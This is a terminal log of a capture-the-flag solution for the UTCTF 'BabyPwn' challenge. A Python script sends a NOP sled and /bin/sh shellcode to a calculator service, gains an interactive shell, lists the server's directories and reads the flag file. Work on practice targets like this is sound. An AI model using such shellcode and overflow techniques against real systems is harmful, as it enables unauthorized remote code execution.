~~~
ugongjae@ubuntu:~/CTF/UTCTF/BabyPwn$ python payload.py 
[+] Opening connection to stack.overflow.fail on port 9000: Done
Welcome to the UT calculator service
What is your name?

Hello \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90H1\xffH1?H1?H1?PH\xbb/bin//shSH\x89??;\x0f\x05
Enter an operation (+ - *): 
Enter the first operand: 
Enter the second operand: 
The sum is: -9223372036854775806

[*] Switching to interactive mode
$ ls
a.out  test
$ cat a.out
$ cat test
$ ls
a.out  test
$ ls -al
total 28
drwxr-xr-x 1 baby baby 4096 Mar  9 23:52 .
drwxr-xr-x 1 root root 4096 Mar  8 07:25 ..
-rw------- 1 baby baby  119 Mar  9 17:21 .bash_history
-rw-r--r-- 1 baby baby  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 baby baby 3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 baby baby  655 May 16  2017 .profile
-rwxrwxr-x 1 baby baby    0 Mar  9 12:18 a.out
-rw-rw-r-- 1 baby baby    0 Mar  9 23:16 test
$ ./a.out
$ whoami
baby
$ cd ..
$ ls
baby
$ cd ..
$ ls
app  boot  etc         home  lib64  mnt  proc    root  sbin  start.sh  tmp  var
bin  dev   flag.txt  lib   media  opt  pwnable    run   srv   sys       usr
$ cat flag.txt
utflag{0h_n0_i_f0rg0t_t0_carry_the_return}
$  
~~~
